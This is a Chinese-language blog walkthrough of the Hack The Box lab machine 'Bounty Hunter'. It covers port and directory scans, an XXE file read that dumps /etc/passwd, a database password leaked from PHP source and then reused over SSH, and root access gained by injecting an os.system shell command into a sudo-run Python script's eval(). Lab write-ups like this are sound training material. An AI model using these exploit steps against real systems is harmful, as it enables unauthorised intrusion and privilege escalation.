---
title: Bounty Hunter (Hack The Box Writeup)
date: 2021-08-13T13:42:00+08:00
draft: false
url: "/2021/08/13/bounty-hunter-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

> 
URL : https://app.hackthebox.eu/machines/359

IP : 10.10.11.100

## Recon

- 凡事都從掃 Port 開始`rustscan -a 10.10.11.100 -r 1-65535`
- ![](/uploads/2022/02/efea2-aIXlags.png)有開 22 80 port掃路徑- `python3 dirsearch.py -u http://10.10.11.100/`
- 發現有一個 `/db.php`進去是空白的還有一個 `/resources/`- ![](/uploads/2022/02/78936-QYLtVYA.png)
- 其中 `README.txt` 裡面有一些小線索![](/uploads/2022/02/ab6a5-tCmklpN.png)發現發送表單頁面有 XXE 漏洞- 直接用 js 在 F12 Console 發

```javascript
async function bountySubmit() {
	try {
		var xml = `
		 ]>
		
		&b;
		456
		meow
		321
		`
		let data = await returnSecret(btoa(xml));
		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
bountySubmit()
```

![](/uploads/2022/02/f41c7-U1evpQI.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

```
- 觀察 `/etc/passwd` 可以猜測，使用者帳號應該是- development
```

- 也可以透過 php 轉 base64 方式讀取原始碼

```markup
]>
```

`portal.php`

```markup
Portal under development. Go here to test the bounty tracker.
```

`log_submit.php`

```php
Bounty Report System - Beta
```

`tracker_diRbPr00f314.php`

```php
loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
$bugreport = simplexml_import_dom($dom);
}
?>
If DB were ready, would have added:

  
    Title:
    title; ?>
  
  
    CWE:
    cwe; ?>
  
  
    Score:
    cvss; ?>
  
  
    Reward:
    reward; ?>
```

發現 `db.php`原始碼裡面有重要的密碼!!

```php
Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

```
- 這邊猜測使用者一組密碼用到底
- 所以把 DB 密碼拿來登 SSH 看看
```

## SSH

- `ssh development@10.10.11.100`帳號從 `/etc/passwd` 取得
- 搭配密碼 `m19RoAU0hP41A1sTsq6K
- ![](/uploads/2022/02/6c519-cX3b2Wq.png)取得 user flag- ![](/uploads/2022/02/37ca0-u5eWqvo.png)

## 提權

- 老規矩 `sudo -l` 起手式![](/uploads/2022/02/94cf8-f78loDV.png)發現我們可以sudo執行、但不能更改一個python檔案

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            print(ticketCode)
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    # fileName = input("Please enter the path to the ticket file.\n")
    fileName = "a.md"
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

- 感覺這個題目很 CTF基本上前半部都只要照著要求做就好
- 最後一個 `eval` 部分就是弱點可以用 python 沙盒逃逸小技巧來繞Exploit

```
# Skytrain Inc
## Ticket to Meow
__Ticket Code:__
**144+__import__("os").system("/bin/bash")
```

- 取得 root flag![](/uploads/2022/02/af038-1bfNnlt.png)
